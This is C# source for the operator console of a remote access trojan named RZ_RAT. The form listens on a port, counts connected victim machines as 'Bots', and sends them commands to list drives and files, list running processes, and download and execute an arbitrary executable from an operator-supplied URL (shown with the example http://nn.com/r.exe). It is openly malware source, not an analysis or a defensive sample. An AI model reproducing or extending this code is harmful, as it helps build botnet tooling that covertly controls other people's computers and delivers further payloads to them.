using Microsoft.VisualBasic;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace RZ_RAT
{
    public partial class Form1 : Form
    {
        public static Server ServerObject = null;
        public FileManger FM = new FileManger();
        public ProcessForm PS = new ProcessForm();
        public Form1()
        {
            InitializeComponent();
        }
   
        private void Form1_Load(object sender, EventArgs e)
        {
            DirectoryInfo dir = new DirectoryInfo(Directory.GetCurrentDirectory() + @"\ico");
            foreach (FileInfo file in dir.GetFiles())
            {
                imageList1.Images.Add(Path.GetFileNameWithoutExtension(file.FullName),Image.FromFile(file.FullName));
            }
            listView1.SmallImageList = imageList1;
            int port = 4562;
            string rr = ShowDialog("Port :", "type port");
            if (!(int.TryParse(rr,out port)))
            {
                port = 4562;
            }
            label1.Text = "Port : " + port;
            ServerObject = new Server(port,this, FM,PS);
            new Thread(new ThreadStart((MethodInvoker)delegate { ServerObject.Strat(); })).Start();
            timer1.Enabled = true;
            
        }
        public static string ShowDialog(string text, string caption)
        {
            Form prompt = new Form()
            {
                Width = 500,
                Height = 150,
                FormBorderStyle = FormBorderStyle.FixedDialog,
                Text = caption,
                StartPosition = FormStartPosition.CenterScreen
            };
            Label textLabel = new Label() { Left = 50, Top = 20, Text = text };
            TextBox textBox = new TextBox() { Left = 50, Top = 50, Width = 400 };
            Button confirmation = new Button() { Text = "Ok", Left = 350, Width = 100, Top = 70, DialogResult = DialogResult.OK };
            confirmation.Click += (sender, e) => { prompt.Close(); };
            prompt.Controls.Add(textBox);
            prompt.Controls.Add(confirmation);
            prompt.Controls.Add(textLabel);
            prompt.AcceptButton = confirmation;

            return prompt.ShowDialog() == DialogResult.OK ? textBox.Text : "";
        }
        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            System.Environment.Exit(0);
        }

        private void msgboxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListView.SelectedListViewItemCollection breakfast = listView1.SelectedItems;

            foreach (ListViewItem item in breakfast)
            {
                string[] ss = ((IEnumerable)item.Tag).Cast<object>()
                                 .Select(x => x.ToString())
                                 .ToArray();
             ServerObject.addCommand(ss, "getDrivers");
             FM.Show();
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            label2.Text = "Bots : " + ServerObject.infoClients.Count;
            foreach (ListViewItem lv in listView1.Items)
            {
                string[] ss = ((IEnumerable)lv.Tag).Cast<object>()
                                 .Select(x => x.ToString())
                                 .ToArray();

                if (ServerObject.GetTimestamp() - int.Parse(ss[1]) > 10)
                {
                    var client = ServerObject.infoClients.Where(d => d[0] == ss[0]).FirstOrDefault();
                    if (client != null) { ServerObject.infoClients.Remove(client); }
                    lv.Remove();
                }
            }
            label3.Text = "Selected : "+listView1.SelectedItems.Count.ToString();
        }

        private void processListToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListView.SelectedListViewItemCollection breakfast = listView1.SelectedItems;

            foreach (ListViewItem item in breakfast)
            {
                string[] ss = ((IEnumerable)item.Tag).Cast<object>()
                                 .Select(x => x.ToString())
                                 .ToArray();
                ServerObject.addCommand(ss, "processlist");
                PS.Show();
            }
        }

        private void downExecToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //dowwwnexec
            ListView.SelectedListViewItemCollection breakfast = listView1.SelectedItems;

            foreach (ListViewItem item in breakfast)
            {
                string[] ss = ((IEnumerable)item.Tag).Cast<object>()
                                 .Select(x => x.ToString())
                                 .ToArray();
                string[] url = ShowDialog("url : ( http://nn.com/r.exe$$temp.exe ) ", "Downloader").Split(new string[] { "$$" }, StringSplitOptions.None) ;
                ServerObject.addCommand(ss, "dowwwnexec<<>>" + url[0] + "<<>>" + url[1]);
                
            }
        }

       
    }
}
